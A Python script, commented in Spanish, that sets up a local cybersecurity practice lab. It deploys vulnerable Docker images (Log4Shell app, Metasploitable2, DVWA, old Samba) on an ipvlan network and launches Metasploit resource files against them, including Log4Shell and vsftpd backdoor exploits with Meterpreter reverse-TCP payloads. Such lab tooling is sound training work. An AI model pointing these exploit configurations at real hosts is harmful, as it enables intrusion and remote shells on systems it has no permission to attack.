#!/usr/bin/env python3
"""
CyberLab Docker Manager
========================
Script para automatizar:
1. Creación de red ipvlan con IPs específicas visibles desde la red del host.
2. Búsqueda y despliegue de contenedores vulnerables para prácticas de ciberseguridad.
3. Lanzamiento de Metasploit (msfconsole) contra los contenedores levantados.

Requisitos:
    pip install docker requests
    Acceso al socket de Docker (usuario en grupo docker o root).
    Conocer la interfaz de red del host (ej: eth0, ens33, wlan0).

Uso:
    python3 docker_cyberlab.py
"""

import docker
import requests
import subprocess
import time
import os
import tempfile
from typing import List, Dict, Optional

# =============================================================================
# CONFIGURACIÓN POR DEFECTO
# =============================================================================
DEFAULT_PARENT_IFACE = "wlan0"  # <-- Cambia esto por tu interfaz de red (ip addr)
DEFAULT_SUBNET = "192.168.100.0/24"
DEFAULT_GATEWAY = "192.168.100.1"
DEFAULT_NETWORK_NAME = "cyberlab_ipvlan"

# Lista curada de imágenes vulnerables conocidas para ejercicios con Metasploit
CURATED_VULNERABLE_IMAGES = {
    "log4j": {
        "image": "ghcr.io/christophetd/log4shell-vulnerable-app",
        "port": 8080,
        "description": "Aplicación Spring Boot vulnerable a Log4Shell (CVE-2021-44228)",
        "exploit_hint": "use exploit/multi/http/log4shell_header_injection",
        "payload_hint": "java/meterpreter/reverse_tcp"
    },
    "metasploitable2": {
        "image": "tleemcjr/metasploitable2",
        "port": None,
        "description": "Metasploitable2 portado a Docker. Múltiples servicios vulnerables.",
        "exploit_hint": "Varios: use exploit/unix/ftp/vsftpd_234_backdoor, exploit/linux/samba/is_known_pipename, etc.",
        "payload_hint": "payload/cmd/unix/interact",
        "command": "sh -c '/bin/services.sh && tail -f /dev/null'"
    },
    "dvwa": {
        "image": "vulnerables/web-dvwa",
        "port": 80,
        "description": "Damn Vulnerable Web Application. Vulnerable a SQLi, XSS, etc.",
        "exploit_hint": "Modulo auxiliar o exploits web manuales",
        "payload_hint": "N/A"
    },
    "samba_old": {
        "image": "vulnerables/cve-2007-2447",  # Samba 3.0.20 (CVE-2007-2447) username map script
        "port": 445,
        "description": "Samba 3.0.20 vulnerable a ejecución de comandos (distinto a EternalBlue, pero útil)",
        "exploit_hint": "use exploit/multi/samba/usermap_script",
        "payload_hint": "payload/cmd/unix/reverse"
    }
}


def get_docker_client() -> docker.DockerClient:
    """Devuelve un cliente Docker. Lanza excepción si no puede conectar."""
    try:
        client = docker.from_env()
        client.ping()
        print("[+] Conectado a Docker correctamente.")
        return client
    except Exception as e:
        raise ConnectionError(f"[-] No se pudo conectar a Docker: {e}. ¿Está el servicio activo y tienes permisos?") from e


# =============================================================================
# TAREA 1: RED IPVLAN CON IPs ESPECÍFICAS
# =============================================================================

def _check_parent_interface_busy(parent_iface: str):
    """Detecta interfaces virtuales (macvlan/ipvlan) sobre la interfaz padre."""
    try:
        result = subprocess.run(["ip", "link", "show"], capture_output=True, text=True, check=True)
        for line in result.stdout.splitlines():
            if f"@{parent_iface}" in line:
                iface_name = line.split(":")[1].strip()
                print(f"[!] AVISO: Detectada interfaz virtual '{iface_name}' sobre '{parent_iface}'.")
                print(f"    Esto puede causar 'device or resource busy' al crear contenedores.")
                print(f"    Ejecuta: sudo ip link del {iface_name}")
    except Exception:
        pass


def create_ipvlan_network(
    client: docker.DockerClient,
    name: str = DEFAULT_NETWORK_NAME,
    subnet: str = DEFAULT_SUBNET,
    gateway: str = DEFAULT_GATEWAY,
    parent_iface: str = DEFAULT_PARENT_IFACE
) -> docker.models.networks.Network:
    """
    Crea una red Docker tipo ipvlan (modo L2) para que los contenedores tengan IP
    propia en la red del host y sean visibles externamente.
    A diferencia de macvlan, ipvlan usa la MISMA MAC del host, por lo que
    funciona correctamente sobre interfaces WiFi (wlan0).
    """
    try:
        # Si ya existe, la removemos para evitar conflictos (opcional)
        existing = client.networks.list(names=[name])
        if existing:
            print(f"[!] La red '{name}' ya existe. Eliminándola para recrear...")
            existing[0].remove()
    except Exception as e:
        print(f"[!] Advertencia al limpiar red existente: {e}")

    _check_parent_interface_busy(parent_iface)

    ipam_pool = docker.types.IPAMPool(
        subnet=subnet,
        gateway=gateway
    )
    ipam_config = docker.types.IPAMConfig(pool_configs=[ipam_pool])

    network = client.networks.create(
        name,
        driver="ipvlan",
        options={"parent": parent_iface, "ipvlan_mode": "l2"},
        ipam=ipam_config,
        attachable=True
    )
    print(f"[+] Red ipvlan '{name}' creada: subnet={subnet}, gateway={gateway}, parent={parent_iface}")
    return network


def run_container_with_fixed_ip(
    client: docker.DockerClient,
    image: str,
    name: str,
    ip_address: str,
    network_name: str = DEFAULT_NETWORK_NAME,
    ports: Optional[Dict[str, str]] = None,
    environment: Optional[Dict[str, str]] = None,
    command: Optional[str] = None,
    auto_pull: bool = True
) -> docker.models.containers.Container:
    """
    Descarga (si es necesario) y levanta un contenedor conectado a la red ipvlan
    con una IPv4 estática.
    """
    if auto_pull:
        try:
            print(f"[*] Descargando imagen '{image}' (si no existe local)...")
            client.images.pull(image)
            print(f"[+] Imagen '{image}' lista.")
        except Exception as e:
            print(f"[!] Error al descargar la imagen '{image}': {e}")
            raise

    # Configuración de red con IP fija usando la API de bajo nivel
    networking_config = client.api.create_networking_config({
        network_name: client.api.create_endpoint_config(ipv4_address=ip_address)
    })

    host_config = client.api.create_host_config(port_bindings=ports or {})

    print(f"[*] Creando contenedor '{name}' con IP {ip_address} en red '{network_name}'...")
    container = client.api.create_container(
        image=image,
        name=name,
        command=command,
        host_config=host_config,
        networking_config=networking_config,
        environment=environment or {},
        detach=True
    )

    try:
        client.api.start(container)
    except docker.errors.APIError as e:
        if "device or resource busy" in str(e):
            print(f"[-] Error: El kernel reporta que el dispositivo de red está ocupado.")
            print(f"    Posiblemente existe una interfaz macvlan/ipvlan sobre '{network_name}'.")
            print(f"    Ejecuta: sudo ip link del <interfaz_conflictiva>  (ej: sudo ip link del macvlan-shim)")
            raise RuntimeError("Interfaz de red ocupada. Elimina el conflicto e intenta de nuevo.") from e
        raise

    container_obj = client.containers.get(container["Id"])
    print(f"[+] Contenedor '{name}' iniciado. ID={container_obj.short_id}")
    return container_obj


def run_container_host_network(
    client: docker.DockerClient,
    image: str,
    name: str,
    environment: Optional[Dict[str, str]] = None,
    command: Optional[str] = None,
    auto_pull: bool = True
) -> docker.models.containers.Container:
    """
    Levanta un contenedor en modo host network (--network host).
    Comparte la IP del servidor y expone puertos directamente.
    """
    if auto_pull:
        try:
            print(f"[*] Descargando imagen '{image}' (si no existe local)...")
            client.images.pull(image)
            print(f"[+] Imagen '{image}' lista.")
        except Exception as e:
            print(f"[!] Error al descargar la imagen '{image}': {e}")
            raise

    print(f"[*] Creando contenedor '{name}' con --network host...")
    container = client.containers.run(
        image=image,
        name=name,
        command=command,
        network_mode="host",
        environment=environment or {},
        detach=True
    )
    print(f"[+] Contenedor '{name}' iniciado en host network. ID={container.short_id}")
    print("[!] Aviso: el contenedor comparte la pila de red del host. Los puertos están directamente en la IP del servidor.")
    return container


# =============================================================================
# TAREA 2: BÚSQUEDA DE CONTENEDORES VULNERABLES
# =============================================================================

def search_docker_hub(query: str, max_results: int = 10) -> List[Dict]:
    """
    Busca imágenes en Docker Hub relacionadas con términos de vulnerabilidad.
    Nota: Docker Hub API v2 es pública pero tiene rate limits.
    """
    url = "https://hub.docker.com/v2/search/repositories"
    params = {
        "query": query,
        "page_size": max_results
    }
    print(f"[*] Buscando en Docker Hub: '{query}' ...")
    try:
        resp = requests.get(url, params=params, timeout=10)
        resp.raise_for_status()
        data = resp.json()
        results = []
        for item in data.get("results", []):
            results.append({
                "name": item.get("repo_name"),
                "description": item.get("short_description", "Sin descripción"),
                "pulls": item.get("pull_count", 0),
                "stars": item.get("star_count", 0)
            })
        return results
    except Exception as e:
        print(f"[-] Error buscando en Docker Hub: {e}")
        return []


def list_curated_vulnerable_images():
    """Muestra las imágenes curadas incluidas en el script."""
    print("\n[*] Imágenes vulnerables curadas disponibles:\n")
    for key, info in CURATED_VULNERABLE_IMAGES.items():
        print(f"    ID: {key}")
        print(f"    Imagen: {info['image']}")
        print(f"    Descripción: {info['description']}")
        print(f"    Puerto: {info['port']}")
        print(f"    Exploit hint: {info['exploit_hint']}")
        print(f"    Payload hint: {info['payload_hint']}")
        print("-" * 60)


# =============================================================================
# TAREA 3: METASPLOIT
# =============================================================================

def generate_msf_resource_file(
    exploit: str,
    target_ip: str,
    target_port: int,
    payload: str,
    lhost: str,
    lport: int = 4444,
    extra_options: Optional[Dict[str, str]] = None
) -> str:
    """
    Genera un archivo de recurso (.rc) para msfconsole.
    Devuelve la ruta al archivo temporal creado.
    """
    lines = [
        f"use {exploit}",
        f"set RHOSTS {target_ip}",
        f"set RPORT {target_port}",
        f"set PAYLOAD {payload}",
        f"set LHOST {lhost}",
        f"set LPORT {lport}",
    ]
    if extra_options:
        for k, v in extra_options.items():
            lines.append(f"set {k} {v}")

    lines.append("run")
    lines.append("exit")  # Cerrar msfconsole al terminar (opcional)

    fd, path = tempfile.mkstemp(suffix=".rc", prefix="msf_resource_")
    with os.fdopen(fd, "w") as f:
        f.write("\n".join(lines))
    print(f"[+] Archivo de recurso de Metasploit creado: {path}")
    print("    Contenido:")
    for line in lines:
        print(f"      {line}")
    return path


def run_metasploit_with_resource(
    resource_path: str,
    use_docker: bool = True,
    msf_image: str = "metasploitframework/metasploit-framework"
) -> Optional[subprocess.Popen]:
    """
    Ejecuta msfconsole usando un archivo de recursos.
    Si use_docker=True, lanza el contenedor oficial de Metasploit.
    Si es False, intenta ejecutar msfconsole desde el sistema host.
    """
    if use_docker:
        print(f"[*] Levantando contenedor de Metasploit ({msf_image})...")
        # Asegurar que la imagen exista
        try:
            client = get_docker_client()
            client.images.pull(msf_image)
        except Exception as e:
            print(f"[!] No se pudo descargar la imagen de Metasploit: {e}")
            return None

        # Para pasar el archivo .rc al contenedor, usamos un volumen temporal
        # msfconsole puede leer /tmp/resource.rc
        cmd = [
            "docker", "run", "--rm", "-it",
            "--network", "host",  # Para que pueda alcanzar las IPs ipvlan del host
            "-v", f"{resource_path}:/tmp/resource.rc:ro",
            msf_image,
            "msfconsole", "-r", "/tmp/resource.rc"
        ]
        print(f"[*] Ejecutando: {' '.join(cmd)}")
        proc = subprocess.Popen(cmd)
        return proc
    else:
        # Ejecución nativa
        cmd = ["msfconsole", "-r", resource_path]
        print(f"[*] Ejecutando msfconsole nativo: {' '.join(cmd)}")
        proc = subprocess.Popen(cmd)
        return proc


def run_msf_auxiliary_scan(
    auxiliary_module: str,
    target_ip: str,
    target_port: int,
    use_docker: bool = True,
    lhost: str = "0.0.0.0"
) -> Optional[subprocess.Popen]:
    """
    Lanza un módulo AUXILIARY (scanner) de Metasploit.
    """
    fd, path = tempfile.mkstemp(suffix=".rc", prefix="msf_aux_")
    lines = [
        f"use {auxiliary_module}",
        f"set RHOSTS {target_ip}",
        f"set RPORT {target_port}",
        "run",
        "exit"
    ]
    with os.fdopen(fd, "w") as f:
        f.write("\n".join(lines))
    print(f"[+] Archivo auxiliar creado: {path}")
    return run_metasploit_with_resource(path, use_docker=use_docker)


# =============================================================================
# ORQUESTACIÓN / EJEMPLOS DE USO
# =============================================================================

def demo_lab_log4j():
    """
    Ejemplo completo:
        1. Elige modo de red (ipvlan o host).
        2. Levanta contenedor vulnerable a Log4j.
        3. Genera recurso de Metasploit y lo lanza.
    """
    print("\n" + "="*70)
    print("DEMO: Laboratorio Log4j (CVE-2021-44228)")
    print("="*70)

    client = get_docker_client()

    # 1. Elegir modo de red
    use_host_net = input("¿Usar modo red HOST (--network host) en lugar de ipvlan? [s/N]: ").strip().lower() == "s"
    net = None
    target_ip = None

    if use_host_net:
        print("[*] Modo seleccionado: HOST network (comparte IP del servidor).")
        target_ip = input("IP de este servidor host para Metasploit [127.0.0.1]: ").strip() or "127.0.0.1"
    else:
        # Red ipvlan
        iface = input(f"Interfaz de red del host para ipvlan [{DEFAULT_PARENT_IFACE}]: ").strip() or DEFAULT_PARENT_IFACE
        subnet = input(f"Subnet [{DEFAULT_SUBNET}]: ").strip() or DEFAULT_SUBNET
        gateway = input(f"Gateway [{DEFAULT_GATEWAY}]: ").strip() or DEFAULT_GATEWAY
        net = create_ipvlan_network(client, parent_iface=iface, subnet=subnet, gateway=gateway)
        target_ip = input("IP fija para el contenedor Log4j [192.168.100.248]: ").strip() or "192.168.100.248"

    # 2. Contenedor vulnerable
    if use_host_net:
        container = run_container_host_network(
            client,
            image=CURATED_VULNERABLE_IMAGES["log4j"]["image"],
            name="vuln_log4j_lab"
        )
    else:
        container = run_container_with_fixed_ip(
            client,
            image=CURATED_VULNERABLE_IMAGES["log4j"]["image"],
            name="vuln_log4j_lab",
            ip_address=target_ip,
            network_name=DEFAULT_NETWORK_NAME,
            ports={"8080/tcp": "8080"}
        )

    print(f"\n[*] Esperando a que el servicio de Log4j inicie (10s)...")
    time.sleep(10)

    # 3. Metasploit
    lhost = input("Tu IP en la red (LHOST) [192.168.100.250]: ").strip() or "192.168.100.250"
    rc_file = generate_msf_resource_file(
        exploit="exploit/multi/http/log4shell_header_injection",
        target_ip=target_ip,
        target_port=8080,
        payload="java/meterpreter/reverse_tcp",
        lhost=lhost,
        lport=4444,
        extra_options={
            "SRVHOST": lhost,
            "TARGETURI": "/",
            "HTTP_HEADER": "X-Api-Version",
            "TARGET": "Automatic"
        }
    )

    use_docker_msf = input("¿Usar Metasploit vía Docker? [S/n]: ").strip().lower() != "n"
    proc = run_metasploit_with_resource(rc_file, use_docker=use_docker_msf)
    if proc:
        try:
            proc.wait()
        except KeyboardInterrupt:
            print("\n[!] Interrumpido por usuario.")

    print("\n[*] Limpieza: eliminando contenedor y red...")
    try:
        container.stop()
        container.remove(force=True)
        if net:
            net.remove()
        print("[+] Limpieza completada.")
    except Exception as e:
        print(f"[!] Error en limpieza: {e}")


def demo_lab_metasploitable2():
    """
    Ejemplo: Levanta Metasploitable2 con IP fija o host network para múltiples ejercicios.
    """
    print("\n" + "="*70)
    print("DEMO: Laboratorio Metasploitable2")
    print("="*70)

    client = get_docker_client()

    # 1. Elegir modo de red
    use_host_net = input("¿Usar modo red HOST (--network host) en lugar de ipvlan? [s/N]: ").strip().lower() == "s"
    net = None
    target_ip = None

    if use_host_net:
        print("[*] Modo seleccionado: HOST network (comparte IP del servidor).")
        target_ip = input("IP de este servidor host para Metasploit [127.0.0.1]: ").strip() or "127.0.0.1"
    else:
        iface = input(f"Interfaz de red del host para ipvlan [{DEFAULT_PARENT_IFACE}]: ").strip() or DEFAULT_PARENT_IFACE
        subnet = input(f"Subnet [{DEFAULT_SUBNET}]: ").strip() or DEFAULT_SUBNET
        gateway = input(f"Gateway [{DEFAULT_GATEWAY}]: ").strip() or DEFAULT_GATEWAY
        net = create_ipvlan_network(client, parent_iface=iface, subnet=subnet, gateway=gateway)
        target_ip = input("IP fija para Metasploitable2 [192.168.100.202]: ").strip() or "192.168.100.202"

    # 2. Contenedor vulnerable
    if use_host_net:
        container = run_container_host_network(
            client,
            image=CURATED_VULNERABLE_IMAGES["metasploitable2"]["image"],
            name="vuln_metasploitable2_lab",
            command=CURATED_VULNERABLE_IMAGES["metasploitable2"].get("command")
        )
    else:
        container = run_container_with_fixed_ip(
            client,
            image=CURATED_VULNERABLE_IMAGES["metasploitable2"]["image"],
            name="vuln_metasploitable2_lab",
            ip_address=target_ip,
            network_name=DEFAULT_NETWORK_NAME,
            command=CURATED_VULNERABLE_IMAGES["metasploitable2"].get("command")
        )

    print(f"\n[+] Metasploitable2 disponible en {target_ip}")
    print("    Puedes escanearlo con nmap o lanzar exploits de Metasploit manualmente.")
    print("    Ejemplo de exploit rápido desde msfconsole:")
    print(f"      use exploit/unix/ftp/vsftpd_234_backdoor")
    print(f"      set RHOSTS {target_ip}")
    print(f"      set RPORT 21")
    print(f"      run")

    input("\nPresiona ENTER para detener y limpiar el laboratorio...")
    try:
        container.stop()
        container.remove(force=True)
        if net:
            net.remove()
        print("[+] Limpieza completada.")
    except Exception as e:
        print(f"[!] Error en limpieza: {e}")


def deploy_curated_image():
    """
    Permite elegir una imagen vulnerable de la lista curada,
    seleccionar modo de red y levantarla.
    """
    print("\n" + "="*70)
    print("DESPLEGAR IMAGEN VULNERABLE CURADA")
    print("="*70)

    keys = list(CURATED_VULNERABLE_IMAGES.keys())
    print("\nImágenes disponibles:")
    for i, k in enumerate(keys, 1):
        info = CURATED_VULNERABLE_IMAGES[k]
        print(f"  {i}. {k} -> {info['image']}")
        print(f"     {info['description']}")

    try:
        sel = int(input("\nSelecciona número: ").strip()) - 1
        if sel < 0 or sel >= len(keys):
            print("[-] Selección inválida.")
            return
    except ValueError:
        print("[-] Entrada no válida.")
        return

    img_id = keys[sel]
    info = CURATED_VULNERABLE_IMAGES[img_id]
    default_name = f"vuln_{img_id}_lab"
    name = input(f"Nombre del contenedor [{default_name}]: ").strip() or default_name

    client = get_docker_client()
    use_host_net = input("¿Usar modo red HOST (--network host) en lugar de ipvlan? [s/N]: ").strip().lower() == "s"
    net = None
    target_ip = None
    container = None

    if use_host_net:
        print("[*] Modo seleccionado: HOST network.")
        target_ip = input("IP de este servidor host [127.0.0.1]: ").strip() or "127.0.0.1"
        container = run_container_host_network(
            client,
            image=info["image"],
            name=name,
            command=info.get("command")
        )
    else:
        iface = input(f"Interfaz de red del host para ipvlan [{DEFAULT_PARENT_IFACE}]: ").strip() or DEFAULT_PARENT_IFACE
        subnet = input(f"Subnet [{DEFAULT_SUBNET}]: ").strip() or DEFAULT_SUBNET
        gateway = input(f"Gateway [{DEFAULT_GATEWAY}]: ").strip() or DEFAULT_GATEWAY
        net = create_ipvlan_network(client, parent_iface=iface, subnet=subnet, gateway=gateway)
        default_ip = "192.168.100.250"
        target_ip = input(f"IP fija para el contenedor [{default_ip}]: ").strip() or default_ip
        container = run_container_with_fixed_ip(
            client,
            image=info["image"],
            name=name,
            ip_address=target_ip,
            network_name=DEFAULT_NETWORK_NAME,
            ports={f"{info['port']}/tcp": str(info['port'])} if info.get("port") else None,
            command=info.get("command")
        )

    print(f"\n[+] Contenedor '{name}' desplegado.")
    print(f"    Acceso: {target_ip}:{info['port'] if info.get('port') else 'varios puertos'}")
    print(f"    Exploit hint: {info['exploit_hint']}")
    print(f"    Payload hint: {info['payload_hint']}")

    input("\nPresiona ENTER para detener y limpiar...")
    try:
        container.stop()
        container.remove(force=True)
        if net:
            net.remove()
        print("[+] Limpieza completada.")
    except Exception as e:
        print(f"[!] Error en limpieza: {e}")


def cleanup_containers():
    """
    Muestra contenedores activos y permite detener/eliminarlos.
    """
    print("\n" + "="*70)
    print("DETENER / LIMPIAR CONTENEDORES")
    print("="*70)

    client = get_docker_client()
    containers = client.containers.list(all=True)
    if not containers:
        print("[i] No hay contenedores en este host.")
        return

    print("\nContenedores encontrados:")
    for i, c in enumerate(containers, 1):
        status = c.status
        print(f"  {i}. {c.name} ({c.image.tags}) -> {status}")

    print("\nOpciones:")
    print("  a. Detener y eliminar TODOS")
    print("  b. Detener y eliminar por número")
    print("  c. Volver")
    opt = input("Selecciona: ").strip().lower()

    if opt == "a":
        for c in containers:
            try:
                if c.status == "running":
                    c.stop()
                c.remove(force=True)
                print(f"[+] {c.name} eliminado.")
            except Exception as e:
                print(f"[!] Error con {c.name}: {e}")
    elif opt == "b":
        try:
            idx = int(input("Número del contenedor: ").strip()) - 1
            c = containers[idx]
            if c.status == "running":
                c.stop()
            c.remove(force=True)
            print(f"[+] {c.name} eliminado.")
        except Exception as e:
            print(f"[!] Error: {e}")
    else:
        print("[i] Cancelado.")


def menu():
    print("\nCyberLab Docker Manager")
    print("-----------------------")
    print("1. Demo Log4j (CVE-2021-44228) + Metasploit")
    print("2. Demo Metasploitable2 (multi-servicios)")
    print("3. Buscar imágenes vulnerables en Docker Hub")
    print("4. Listar imágenes curadas locales")
    print("5. Desplegar imagen vulnerable curada")
    print("6. Detener / limpiar contenedores activos")
    print("7. Salir")


def main():
    while True:
        menu()
        choice = input("Selecciona una opción: ").strip()

        if choice == "1":
            demo_lab_log4j()
        elif choice == "2":
            demo_lab_metasploitable2()
        elif choice == "3":
            query = input("Término de búsqueda (ej: vulnerable metasploit): ").strip()
            results = search_docker_hub(query)
            if results:
                print(f"\n[+] Resultados para '{query}':\n")
                for r in results:
                    print(f"  - {r['name']} (⭐ {r['stars']} | ⬇️ {r['pulls']})")
                    print(f"    {r['description']}")
            else:
                print("[-] Sin resultados.")
        elif choice == "4":
            list_curated_vulnerable_images()
        elif choice == "5":
            deploy_curated_image()
        elif choice == "6":
            cleanup_containers()
        elif choice == "7":
            print("Saliendo...")
            break
        else:
            print("Opción inválida.")


if __name__ == "__main__":
    main()
